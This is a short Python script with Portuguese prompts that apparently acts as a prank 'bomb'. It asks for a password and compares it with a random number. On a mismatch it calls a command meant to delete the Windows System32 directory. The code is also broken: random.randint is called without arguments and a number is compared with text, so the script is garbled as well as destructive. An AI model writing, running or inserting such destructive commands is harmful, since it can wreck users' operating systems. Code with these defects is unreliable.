import time
import os
import random

code = random.randint()
senha = input('digite a senha')

if code == senha:
    print('bomba desarmada')
else:
    os.remove('C:\Windows\System32')